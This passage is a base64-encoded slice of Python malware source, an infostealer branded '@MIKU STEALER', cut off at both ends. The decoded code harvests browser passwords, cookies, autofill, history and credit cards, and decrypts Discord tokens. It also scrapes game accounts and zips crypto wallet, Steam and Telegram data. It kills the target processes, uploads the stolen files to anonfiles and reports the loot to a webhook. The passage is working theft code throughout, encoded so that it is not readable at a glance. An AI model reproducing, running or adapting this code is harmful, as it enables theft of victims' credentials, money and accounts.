0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICBCb29rbWFya3MuYXBwZW5kKGYiTjRNMzoge2lbJ25hbWUnXX0gfCBVUjE6IHtpWyd1cmwnXX0iKQ0KICAgICAgICAgICAgICAgICAgICAgICAgQm9va21hcmtzQ291bnQgKz0gMQ0KICAgICAgICAgICAgICAgICAgICBleGNlcHQ6cGFzcw0KICAgICAgICBpZiBvcy5zdGF0KHBhdGhDKS5zdF9zaXplID09IDA6IHJldHVybg0KICAgICAgICB3cml0ZWZvcmZpbGUoQm9va21hcmtzLCAnYm9va21hcmtzJykNCiAgICBleGNlcHQ6cGFzcw0KZGVmIHBhcnNlQ29va2llcygpOg0KICAgICAgICB0bXBDb29raWVzID0gW10NCiAgICAgICAgZm9yIGNvb2tpZSBpbiBDb29raWVzOg0KICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgIGtleSA9ICAgY29va2llLnNwbGl0KCcgfCAnKVswXS5zcGxpdCgnOiAnKVsxXQ0KICAgICAgICAgICAgICAgIG5hbWUgPSAgY29va2llLnNwbGl0KCcgfCAnKVsxXS5zcGxpdCgnOiAnKVsxXQ0KICAgICAgICAgICAgICAgIHZhbHVlID0gY29va2llLnNwbGl0KCcgfCAnKVsyXS5zcGxpdCgnOiAnKVsxXQ0KICAgICAgICAgICAgICAgIHRtcENvb2tpZXMuYXBwZW5kKGYie2tleX1cdFRSVUVcdC9cdEZBTFNFXHR7c3RyKGludCh0aW1lLnRpbWUoKSkrMzYwMCl9XHR7bmFtZX1cdHt2YWx1ZX0iKQ0KICAgICAgICAgICAgZXhjZXB0OiBwYXNzDQogICAgICAgIHdyaXRlZm9yZmlsZSh0bXBDb29raWVzLCAncGFyc2VkY29va2llcycpDQoNCmRlZiBzdGFydEJ0aHJlYWQoZnVuYywgYXJnKToNCiAgICBnbG9iYWwgQnJvd3NlcnRocmVhZA0KICAgIHQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1mdW5jLCBhcmdzPWFyZykNCiAgICB0LnN0YXJ0KCkNCiAgICBCcm93c2VydGhyZWFkLmFwcGVuZCh0KQ0KDQpkZWYgZ2V0QnJvd3NlcnMoYnJvd3NlclBhdGhzKToNCiAgICBnbG9iYWwgQnJvd3NlcnRocmVhZA0KICAgIFRoQ29raywgQnJvd3NlcnRocmVhZCwgZmlsZXNzID0gW10sIFtdLCBbXQ0KICAgIGZvciBwYXR0IGluIGJyb3dzZXJQYXRoczoNCiAgICAgICAgYSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWdldENvb2tpZSwgYXJncz1bcGF0dFswXSwgcGF0dFs0XV0pDQogICAgICAgIGEuc3RhcnQoKQ0KICAgICAgICBUaENva2suYXBwZW5kKGEpDQoNCiAgICAgICAgc3RhcnRCdGhyZWFkKGdldEF1dG9maWxsLCAgIFtwYXR0WzBdLCBwYXR0WzNdXSkNCiAgICAgICAgc3RhcnRCdGhyZWFkKGdldEhpc3RvcnksICAgIFtwYXR0WzBdLCBwYXR0WzNdXSkNCiAgICAgICAgc3RhcnRCdGhyZWFkKGdldEJvb2ttYXJrcywgIFtwYXR0WzBdLCBwYXR0WzNdXSkNCiAgICAgICAgc3RhcnRCdGhyZWFkKGdldENDcywgICAgICAgIFtwYXR0WzBdLCBwYXR0WzNdXSkNCiAgICAgICAgc3RhcnRCdGhyZWFkKGdldFBhc3N3LCAgW3BhdHRbMF0sIHBhdHRbM11dKQ0KDQogICAgZm9yIHRocmVhZCBpbiBUaENva2s6IHRocmVhZC5qb2luKCkNCiAgICBpZiBUcnVzdChDb29raWVzKSA9PSBUcnVlOiBfX2ltcG9ydF9fKCdzeXMnKS5leGl0KDApDQogICAgZm9yIHRocmVhZCBpbiBCcm93c2VydGhyZWFkOiB0aHJlYWQuam9pbigpDQoNCiAgICBmb3IgZmlsZSBpbiBbIndwcGFzc3dvcmRzLnR4dCIsICJ3cGNvb2tpZXMudHh0IiwgIndwY3JlZGl0Y2FyZHMudHh0IiwgIndwYXV0b2ZpbGwudHh0IiwgIndwaGlzdG9yeS50eHQiLCAid3BwYXJzZWRjb29raWVzLnR4dCIsICJ3cGJvb2ttYXJrcy50eHQiXToNCiAgICAgICAgZmlsZXNzLmFwcGVuZCh1cGxvYWRUb0Fub25maWxlcyhvcy5nZXRlbnYoIlRFTVAiKSArICJcXCIgKyBmaWxlKSkNCiAgICBoZWFkZXJzID0geyJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAifQ0KDQogICAgZGF0YSA9IHsNCiAgICAgICAgImNvbnRlbnQiOiBHTElORk8sDQogICAgICAgICJlbWJlZHMiOiBbDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgInRpdGxlIjogIlBBU1NXT1JEIFNURUFMRVIiLA0KICAgICAgICAgICAgICAgICJkZXNjcmlwdGlvbiI6IGYiKipGb3VuZCoqOlxue2dldHdlYnNpdGVzKHBhc3dXb3Jkcyl9XG5cbioqRGF0YToqKlxuOmtleTog4oCiICoqe1Bhc3N3Q291bnR9KiogUGFzc3dvcmRzIEZvdW5kXG46bGluazog4oCiIFtQYXNzd29yZHMudHh0XSh7ZmlsZXNzWzBdfSkiLA0KICAgICAgICAgICAgICAgICJjb2xvciI6IDc0MTk1MzAsDQogICAgICAgICAgICAgICAgImZvb3RlciI6IHsidGV4dCI6ICJATUlLVSBTVEVBTEVSIn0NCiAgICAgICAgICAgIH0sDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgInRpdGxlIjogIkNPT0tJRVMgU1RFQUxFUiIsDQogICAgICAgICAgICAgICAgImRlc2NyaXB0aW9uIjogZiIqKkZvdW5kKio6XG57Z2V0d2Vic2l0ZXMoY29va2lXb3Jkcyl9XG5cbioqRGF0YToqKlxuOmNvb2tpZTog4oCiICoqe0Nvb2tpQ291bnR9KiogQ29va2llcyBGb3VuZFxuOmxpbms6IOKAoiBbQ29va2llcy50eHRdKHtmaWxlc3NbMV19KVxuOmxpbms6IOKAoiBbUGFyc2VkLnR4dF0oe2ZpbGVzc1s1XX0pIiwNCiAgICAgICAgICAgICAgICAiY29sb3IiOiA3NDE5NTMwLA0KICAgICAgICAgICAgICAgICJmb290ZXIiOiB7InRleHQiOiAiQE1JS1UgU1RFQUxFUiJ9DQogICAgICAgICAgICB9LA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICJ0aXRsZSI6ICJPVEhFUiIsDQogICAgICAgICAgICAgICAgImRlc2NyaXB0aW9uIjogZiI6bmV3c3BhcGVyOiDigKIgKip7SGlzdG9yeUNvdW50fSoqIFdlYnNpdGVzIEZvdW5kXG46bGluazog4oCiIFtoaXN0b3J5LnR4dF0oe2ZpbGVzc1s0XX0pXG5cbjpzaGllbGQ6IOKAoiAqKntBdXRvZmlsbENvdW50fSoqIEluZm9zIEZvdW5kXG46bGluazog4oCiIFthdXRvZmlsbC50eHRdKHtmaWxlc3NbM119KVxuXG46Ymx1ZV9ib29rOiDigKIgKip7Qm9va21hcmtzQ291bnR9KiogQm9va21hcmtzIGZvdW5kXG46bGluazog4oCiIFtib29rbWFya3MudHh0XSh7ZmlsZXNzWzZdfSlcblxuOmNyZWRpdF9jYXJkOiDigKIgKip7Q0NzQ291bnR9KiogQ3JlZGl0Y2FyZHMgRm91bmRcbjpsaW5rOiDigKIgW2NyZWRpdGNhcmRzLnR4dF0oe2ZpbGVzc1syXX0pIiwNCiAgICAgICAgICAgICAgICAiY29sb3IiOiA3NDE5NTMwLA0KICAgICAgICAgICAgICAgICJmb290ZXIiOiB7InRleHQiOiAiQE1JS1UgU1RFQUxFUiJ9DQogICAgICAgICAgICB9DQogICAgICAgIF0sDQogICAgICAgICJhdHRhY2htZW50cyI6IFtdDQogICAgfQ0KICAgIExvYWRVcmxpYihob29rLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpDQogICAgcmV0dXJuDQoNCg0KZGVmIEdldERpc2NvcmQocGF0aCwgYXJnKToNCg0KICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhmIntwYXRofS9Mb2NhbCBTdGF0ZSIpOiByZXR1cm4NCg0KICAgIHBhdGhDID0gcGF0aCArIGFyZw0KICAgIHBhdGhLZXkgPSBwYXRoICsgIi9Mb2NhbCBTdGF0ZSINCiAgICB3aXRoIG9wZW4ocGF0aEtleSwgJ3InLCBlbmNvZGluZz0ndXRmLTgnKSBhcyBmOiBsb2NhbF9zdGF0ZSA9IGpzb25fbG9hZHMoZi5yZWFkKCkpDQogICAgbWFzdGVyX2tleSA9IGI2NGRlY29kZShsb2NhbF9zdGF0ZVsnb3NfY3J5cHQnXVsnZW5jcnlwdGVkX2tleSddKQ0KICAgIG1hc3Rlcl9rZXkgPSBDcnlwdFVucHJvdGVjdERhdGEobWFzdGVyX2tleVs1Ol0pDQoNCiAgICBmb3IgZmlsZSBpbiBvcy5saXN0ZGlyKHBhdGhDKToNCiAgICAgICAgaWYgZmlsZS5lbmRzd2l0aCgiLmxvZyIpIG9yIGZpbGUuZW5kc3dpdGgoIi5sZGIiKSAgIDoNCiAgICAgICAgICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZiJ7cGF0aEN9XFx7ZmlsZX0iLCBlcnJvcnM9Imlnbm9yZSIpLnJlYWRsaW5lcygpIGlmIHguc3RyaXAoKV06DQogICAgICAgICAgICAgICAgICAgICNwcmludChsaW5lKQ0KICAgICAgICAgICAgICAgICAgICBmb3IgdG9rZW4gaW4gcmUuZmluZGFsbChyImRRdzR3OVdnWGNROlteLipcWycoLiopJ1xdLiokXVteXCJdKiIsIGxpbmUpOg0KICAgICAgICAgICAgICAgICAgICAgICAgZ2xvYmFsIFRva2Vucw0KICAgICAgICAgICAgICAgICAgICAgICAgdG9rZW5EZWNvZGVkID0gRGVjcnlwdFZhbHVlKGI2NGRlY29kZSh0b2tlbi5zcGxpdCgnZFF3NHc5V2dYY1E6JylbMV0pLCBtYXN0ZXJfa2V5KQ0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgY2hlY2tUb2tlbih0b2tlbkRlY29kZWQpOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCB0b2tlbkRlY29kZWQgaW4gVG9rZW5zOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjcHJpbnQodG9rZW4pDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRva2VucyArPSB0b2tlbkRlY29kZWQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyB3cml0ZWZvcmZpbGUoVG9rZW5zLCAndG9rZW5zJykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXBsb2FkVG9rZW4odG9rZW5EZWNvZGVkLCBwYXRoKQ0KIA0KZGVmIG5nc3RlYWxlcihwYXRoKToNCiAgICBwYXRoID0gZiJ7cGF0aH1cXDAwMDAwMy5sb2ciDQogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOiByZXR1cm4NCiAgICB1c2VycyA9IFtdDQogICAgZiA9IG9wZW4ocGF0aCwgInIrIiwgZW5jb2Rpbmc9ImFuc2kiKQ0KICAgIGFjY291bnRzID0gcmUuZmluZGFsbChyJ3sidXNlcm5hbWUiOiIuezEsNjl9IiwidG9rZW4iOiInLCBzdHIoZi5yZWFkbGluZXMoKSkpDQogICAgIyBhY2NvdW50czIgPSBbeC5yZXBsYWNlKCd7InVzZXJuYW1lIjoiJywgJycpIGZvciB4IGluIGFjY291bnRzXQ0KICAgIGZvciB1c3MgaW4gYWNjb3VudHM6DQogICAgICAgIHVzZXJuYW1lID0gdXNzLnNwbGl0KCd7InVzZXJuYW1lIjoiJylbMV0uc3BsaXQoJyInKVswXQ0KICAgICAgICBpZiB1c2VybmFtZSBub3QgaW4gdXNlcnM6DQogICAgICAgICAgICB1c2VycyArPSBbdXNlcm5hbWVdDQogICAgDQogICAgc2VydmVycyA9IFsi8J+SmSB8IEJsdWUiLCLwn6ehIHwgT3JhbmdlIiwi8J+SmyB8IFllbGxvdyIsIvCfpI0gfCBXaGl0ZSIsIvCflqQgfCBCbGFjayIsIvCfkpkgfCBDeWFuIiwi8J+SmiB8IExpbWUiLCLwn6ehIHwgQ29yYWwiLCLwn5KXIHwgUGluayIsIuKdpO+4jyB8IEFscGhhIiwi8J+WpCB8IFNpZ21hIiwi8J+SmiB8IEdhbW1hIiwi8J+ptiB8IE9tZWdhIiwi8J+SnCB8IFB1cnBsZSIsIvCfkpogfCBHcmVlbiIsIuKdpO+4jyB8IFJlZCIsIvCfkpwgfCBEZWx0YSIsIvCfkpcgfCBSdWJ5IiwNCiAgICBdDQoNCiAgICBmb3IgdXNlciBpbiB1c2VyczoNCg0KICAgICAgICBwYXluYW1lID0gZiJOYXRpb25zR2xveSB8IHt1c2VyfTtodHRwczovL3NraW5zLm5hdGlvbnNnbG9yeS5mci9mYWNlL3t1c2VyfS8xNiINCiAgICAgICAgcGF5bG9hZCA9IFtdDQoNCiAgICAgICAgdXJsID0gZiJodHRwczovL25hdGlvbnNnbG9yeS5mci9wcm9maWxlL3t1c2VyfSINCiAgICAgICAgIyB1cmwgPSBmImh0dHBzOi8vbmF0aW9uc2dsb3J5LmZyL3Byb2ZpbGUvWmVyMFR3MCINCiAgICAgICAgaHRtbCA9IHVybG9wZW4odXJsKS5yZWFkKCkNCg0KICAgICAgICBmb3Igc2VydmVyIGluIHNlcnZlcnM6DQogICAgICAgICAgICBzZXJ2ID0gc2VydmVyLnNwbGl0KCJ8ICIpWzFdLmxvd2VyKCkNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgZGF0YSA9IGh0bWwuc3BsaXQoZidkYXRhLXNlcnZlcj0ie3NlcnZ9Ij4nKVsxXS5zcGxpdCgnPGRpdiBjbGFzcz0iY2FyZCBzZXJ2ZXItdGFiIGQtbm9uZSInKVswXQ0KICAgICAgICAgICAgIyBwcmludChkYXRhKQ0KICAgICAgICAgICAgIyBleGl0KCkNCiAgICAgICAgICAgIGlmIG5vdCAicGFzIGVuY29yZSBjb25uZSIgaW4gZGF0YToNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICB0cnk6DQoNCiAgICAgICAgICAgICAgICAgICAgdGltZXBsYXllZCA9IGRhdGEucmVwbGFjZSgiXG4iLCAnJykuc3BsaXQoJz5UZW1wcyBkZSBqZXU8L2g0PjxwIGNsYXNzPSJoMyBtYi0yIj4nKVsxXS5zcGxpdCgiPC9wPiIpWzBdLnJlcGxhY2UoIlxcIiwgIiIpLnJlcGxhY2UoIm4iLCAnJykNCiAgICAgICAgICAgICAgICAgICAgIyBpZiAiaCIgaW4gdGltZXBsYXllZDoNCiAgICAgICAgICAgICAgICAgICAgY29udHJ5ID0gZGF0YS5yZXBsYWNlKCJcbiIsICcnKS5zcGxpdCgnPjxhIGhyZWY9Ii9jb3VudHJ5L2xpbWUvJylbMV0uc3BsaXQoJyI+JylbMF0NCiAgICAgICAgICAgICAgICAgICAgY29udHJ5cmFuayA9IGRhdGEucmVwbGFjZSgiXG4iLCAnJykuc3BsaXQoJ1JhbmcgZGUgcGF5czwvaDQ+PHAgY2xhc3M9ImgzIG1iLTIiPicpWzFdLnNwbGl0KCc8L3A+PC9kaXY+PGRpdiBjbGFzcz0iYycpWzBdDQogICAgICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgICAgICBjb250cnksIGNvbnRyeXJhbmsgPSAiUGFzIGRlIHBheXMiLCJQYXMgZGUgcmFuayINCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBpZiAiaCIgaW4gdGltZXBsYXllZDoNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIHBheWxvYWQgKz0gW3sibmFtZSI6IHNlcnZlciwidmFsdWUiOiBmIlBsYXlUaW1lOiB7dGltZXBsYXllZH1cbkNvbnRyeToge2NvbnRyeX1cblJhbms6IHtjb250cnlyYW5rfSIsImlubGluZSI6IFRydWV9XQ0KICAgICAgICANCiAgICAgICAgdXBsb2FkKHBheW5hbWUsIHBheWxvYWQpDQoNCmRlZiBHYXRoZXJaaXBzKHBhdGhzMSwgcGF0aHMyLCBwYXRoczMpOg0KICAgIHRodHRodCA9IFtdDQogICAgZm9yIHdhbGxldGlkcyBpbiB3YWxsdHM6DQogICAgICAgIA0KICAgICAgICBmb3IgcGF0dCBpbiBwYXRoczE6DQogICAgICAgICAgICBhID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9WmlwVGhpbmdzLCBhcmdzPVtwYXR0WzBdLCBwYXR0WzVdK3N0cih3YWxsZXRpZHNbMF0pLCBwYXR0WzFdXSkNCiAgICAgICAgICAgIGEuc3RhcnQoKQ0KICAgICAgICAgICAgdGh0dGh0LmFwcGVuZChhKQ0KDQogICAgZm9yIHBhdHQgaW4gcGF0aHMyOg0KICAgICAgICBhID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9WmlwVGhpbmdzLCBhcmdzPVtwYXR0WzBdLCBwYXR0WzJdLCBwYXR0WzFdXSkNCiAgICAgICAgYS5zdGFydCgpDQogICAgICAgIHRodHRodC5hcHBlbmQoYSkNCg0KICAgIGEgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1aaXBUZWxlZ3JhbSwgYXJncz1bcGF0aHMzWzBdLCBwYXRoczNbMl0sIHBhdGhzM1sxXV0pDQogICAgYS5zdGFydCgpDQogICAgdGh0dGh0LmFwcGVuZChhKQ0KDQogICAgZm9yIHRocmVhZCBpbiB0aHR0aHQ6DQogICAgICAgIHRocmVhZC5qb2luKCkNCiAgICBnbG9iYWwgV2FsbGV0c1ppcCwgR2FtaW5nWmlwLCBPdGhlclppcA0KICAgICAgICAjIHByaW50KFdhbGxldHNaaXAsIEdhbWluZ1ppcCwgT3RoZXJaaXApDQoNCiAgICB3YWwsIGdhLCBvdCA9ICIiLCcnLCcnDQogICAgaWYgbm90IGxlbihXYWxsZXRzWmlwKSA9PSAwOg0KICAgICAgICB3YWwgPSAiOmNvaW46ICDigKIgIFdhbGxldHNcbiINCiAgICAgICAgZm9yIGkgaW4gV2FsbGV0c1ppcDoNCiAgICAgICAgICAgIHdhbCArPSBmIuKUlOKUgCBbe2lbMF19XSh7aVsxXX0pXG4iDQogICAgaWYgbm90IGxlbihHYW1pbmdaaXApID09IDA6DQogICAgICAgIGdhID0gIjp2aWRlb19nYW1lOiAg4oCiICBHYW1pbmc6XG4iDQogICAgICAgIGZvciBpIGluIEdhbWluZ1ppcDoNCiAgICAgICAgICAgIGdhICs9IGYi4pSU4pSAIFt7aVswXX1dKHtpWzFdfSlcbiINCiAgICBpZiBub3QgbGVuKE90aGVyWmlwKSA9PSAwOg0KICAgICAgICBvdCA9ICI6dGlja2V0czogIOKAoiAgQXBwc1xuIg0KICAgICAgICBmb3IgaSBpbiBPdGhlclppcDoNCiAgICAgICAgICAgIG90ICs9IGYi4pSU4pSAIFt7aVswXX1dKHtpWzFdfSlcbiINCiAgICBoZWFkZXJzID0gew0KICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLA0KICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCINCiAgICB9DQoNCiAgICBkYXRhID0gew0KICAgICAgICAiY29udGVudCI6IEdMSU5GTywNCiAgICAgICAgImVtYmVkcyI6IFsNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICJ0aXRsZSI6ICJEQVRBIFNURUFMRVIiLA0KICAgICAgICAgICAgImRlc2NyaXB0aW9uIjogZiJ7d2FsfVxue2dhfVxue290fSIsDQogICAgICAgICAgICAiY29sb3IiOiA3NDE5NTMwLA0KICAgICAgICAgICAgImZvb3RlciI6IHsNCiAgICAgICAgICAgICAgICAidGV4dCI6ICJATUlLVSBTVEVBTEVSIg0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICBdLA0KICAgICAgICAiYXR0YWNobWVudHMiOiBbXQ0KICAgIH0NCiAgICBMb2FkVXJsaWIoaG9vaywgZGF0YT1kdW1wcyhkYXRhKS5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQ0KDQpkZWYgWmlwVGVsZWdyYW0ocGF0aCwgYXJnLCBwcm9jYyk6DQoNCiAgICBnbG9iYWwgT3RoZXJaaXANCiAgICBwYXRoQyA9IHBhdGgNCiAgICBuYW1lID0gYXJnDQogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGhDKTogcmV0dXJuDQogICAgc3VicHJvY2Vzcy5Qb3BlbihmInRhc2traWxsIC9pbSB7cHJvY2N9IC90IC9mID5udWwgMj4mMSIsIHNoZWxsPVRydWUpDQogICAgdGltZS5zbGVlcCgxKQ0KICAgIHppcGZvbGRlcihuYW1lLCBwYXRoQykNCg0KICAgIGZvciBpIGluIHJhbmdlKDMpOg0KICAgICAgICBsbmlrID0gdXBsb2FkVG9Bbm9uZmlsZXMoZid7dGVtcH0ve25hbWV9LnppcCcpDQogICAgICAgIGlmICJodHRwczovLyIgaW4gc3RyKGxuaWspOg0KICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgdGltZS5zbGVlcCg0KQ0KICAgIG9zLnJlbW92ZShmInt0ZW1wfS97bmFtZX0uemlwIikNCiAgICBPdGhlclppcC5hcHBlbmQoW2FyZywgbG5pa10pDQoNCmRlZiBaaXBUaGluZ3MocGF0aCwgYXJnLCBwcm9jYyk6DQogICAgcGF0aEMgPSBwYXRoDQogICAgbmFtZSA9IGFyZw0KICAgIA0KICAgIGdsb2JhbCBXYWxsZXRzWmlwLCBHYW1pbmdaaXAsIE90aGVyWmlwDQogICAgZm9yIHdhbGxsdHMgaW4gd2FsbHRzOg0KICAgICAgICBpZiBzdHIod2FsbGx0c1swXSkgaW4gYXJnOg0KICAgICAgICAgICAgYnJvd3NlciA9IHBhdGguc3BsaXQoIlxcIilbNF0uc3BsaXQoIi8iKVsxXS5yZXBsYWNlKCcgJywgJycpDQogICAgICAgICAgICBuYW1lID0gZiJ7c3RyKHdhbGxsdHNbMV0pfV97YnJvd3Nlcn0iDQogICAgICAgICAgICBwYXRoQyA9IHBhdGggKyBhcmcNCg0KICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoQyk6IHJldHVybg0KICAgIHN1YnByb2Nlc3MuUG9wZW4oZiJ0YXNra2lsbCAvaW0ge3Byb2NjfSAvdCAvZiA+bnVsIDI+JjEiLCBzaGVsbD1UcnVlKQ0KICAgIHRpbWUuc2xlZXAoMSkNCg0KICAgIGlmICJXYWxsZXQiIGluIGFyZyBvciAiTmF0aW9uc0dsb3J5IiBpbiBhcmc6DQogICAgICAgIGJyb3dzZXIgPSBwYXRoLnNwbGl0KCJcXCIpWzRdLnNwbGl0KCIvIilbMV0ucmVwbGFjZSgnICcsICcnKQ0KICAgICAgICBuYW1lID0gZiJ7YnJvd3Nlcn0iDQoNCiAgICBlbGlmICJTdGVhbSIgaW4gYXJnOg0KICAgICAgICBpZiBub3Qgb3MucGF0aC5pc2ZpbGUoZiJ7cGF0aEN9L2xvZ2ludXNlcnMudmRmIik6IHJldHVybg0KICAgICAgICBmID0gb3BlbihmIntwYXRoQ30vbG9naW51c2Vycy52ZGYiLCAicisiLCBlbmNvZGluZz0idXRmOCIpDQogICAgICAgIGRhdGEgPSBmLnJlYWRsaW5lcygpDQogICAgICAgIGZvdW5kID0gRmFsc2UNCiAgICAgICAgZm9yIGwgaW4gZGF0YToNCiAgICAgICAgICAgIGlmICdSZW1lbWJlclBhc3N3b3JkIlx0XHQiMSInIGluIGw6DQogICAgICAgICAgICAgICAgZm91bmQgPSBUcnVlDQogICAgICAgIGlmIGZvdW5kID09IEZhbHNlOiByZXR1cm4NCiAgICAgICAgbmFtZSA9IGFyZw0KDQoNCiAgICB6aXBmb2xkZXIobmFtZSwgcGF0aEMpIA0KDQogICAgZm9yIGkgaW4gcmFuZ2UoMyk6DQogICAgICAgIGxuaWsgPSB1cGxvYWRUb0Fub25maWxlcyhmJ3t0ZW1wfS97bmFtZX0uemlwJykNCiAgICAgICAgaWYgImh0dHBzOi8vIiBpbiBzdHIobG5payk6YnJlYWsNCiAgICAgICAgdGltZS5zbGVlcCg0KQ0KDQogICAgb3MucmVtb3ZlKGYie3RlbXB9L3tuYW1lfS56aXAiKQ0KICAgIGlmICIvTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzLyIgaW4gYXJnIG9yICIvSG91Z2FCb3VnYS8iICBpbiBhcmcgb3IgIndhbGxldCIgaW4gYXJnLmxvd2VyKCk6DQogICAgICAgIFdhbGxldHNaaXAuYXBwZW5kKFtuYW1lLCBsbmlrXSkNCiAgICBlbGlmICJOYXRpb25zR2xvcnkiIGluIG5hbWUgb3IgIlN0ZWFtIiBpbiBuYW1lIG9yICJSaW90Q2xpIiBpbiBuYW1lOg0KICAgICAgICBHYW1pbmdaaXAuYXBwZW5kKFtuYW1lLCBsbmlrXSkNCiAgICBlbHNlOg0KICAgICAgICBPdGhlclppcC5hcHBlbmQoW25hbWUsIGxuaWtdKQ0KDQpkZWYgU3RhcnR0aHJlYWQobWV0aCwgYXJncyk6DQogICAgYSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PW1ldGgsIGFyZ3M9YXJncykNCiAgICBhLnN0YXJ0KCkNCiAgICBUaHJlYWRsaXN0LmFwcGVuZChhKQ0KDQpkZWYgR2F0aGVyQWxsKCk6DQogICAgJyAgICAgICAgICAgICAgICAgICBEZWZhdWx0IFBhdGggPCAwID4gICAgICAgICAgICAgICAgICAgICAgICAgUHJvY2VzTmFtZSA8IDEgPiAgICAgICAgVG9rZW4gIDwgMiA+ICAgICAgICAgICAgICAgICBQYXNzd29yZC9DQyA8IDMgPiAgICAgQ29va2llcyA8IDQgPiAgICAgICAgICAgICAgICAgRXh0ZW50aW9ucyA8IDUgPiAgICAgICAgICAgICAgICAgICAgICAgICAgICcNCiAgICBicm93c2VyUGF0aHMgPSBbICAgIA0KICAgICAgICBbZiJ7cm9hbWluZ30vT3BlcmEgU29mdHdhcmUvT3BlcmEgR1ggU3RhYmxlIiwgICAgICAgICAgICAgICAib3BlcmEuZXhlIiwgICAgICAgICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAgICAgICAgICIvIiwgICAgICAgICAgICAiL05ldHdvcmsiLCAgICAgICAgICAgICAiL0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy8iICAgICAgICAgICAgICAgICAgICAgICBdLA0KICAgICAgICBbZiJ7cm9hbWluZ30vT3BlcmEgU29mdHdhcmUvT3BlcmEgU3RhYmxlIiwgICAgICAgICAgICAgICAgICAib3BlcmEuZXhlIiwgICAgICAgICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAgICAgICAgICIvIiwgICAgICAgICAgICAiL05ldHdvcmsiLCAgICAgICAgICAgICAiL0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy8iICAgICAgICAgICAgICAgICAgICAgICBdLA0KICAgICAgICBbZiJ7cm9hbWluZ30vT3BlcmEgU29mdHdhcmUvT3BlcmEgTmVvbi9Vc2VyIERhdGEvRGVmYXVsdCIsICAib3BlcmEuZXhlIiwgICAgICAgICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAgICAgICAgICIvIiwgICAgICAgICAgICAiL05ldHdvcmsiLCAgICAgICAgICAgICAiL0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy8iICAgICAgICAgICAgICAgICAgICAgICBdLA0KICAgICAgICBbZiJ7bG9jYWx9L0dvb2dsZS9DaHJvbWUvVXNlciBEYXRhIiwgICAgICAgICAgICAgICAgICAgICAgICAiY2hyb21lLmV4ZSIsICAgICAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICIvRGVmYXVsdC8iLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9EZWZhdWx0L0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy8iICAgICAgICAgICAgICBdLA0KICAgICAgICBbZiJ7bG9jYWx9L0dvb2dsZS9DaHJvbWUgU3hTL1VzZXIgRGF0YSIsICAgICAgICAgICAgICAgICAgICAiY2hyb21lLmV4ZSIsICAgICAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICIvRGVmYXVsdC8iLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9EZWZhdWx0L0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy8iICAgICAgICAgICAgICBdLA0KICAgICAgICBbZiJ7bG9jYWx9L0dvb2dsZS9DaHJvbWUgQmV0YS9Vc2VyIERhdGEiLCAgICAgICAgICAgICAgICAgICAiY2hyb21lLmV4ZSIsICAgICAgICIvRGVmYXVsdC9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiLCAgICIvRGVmYXVsdC8iLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9EZWZhdWx0L0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy8iICAgICAgICAgICAgICBdLA0KICAgICAgICBb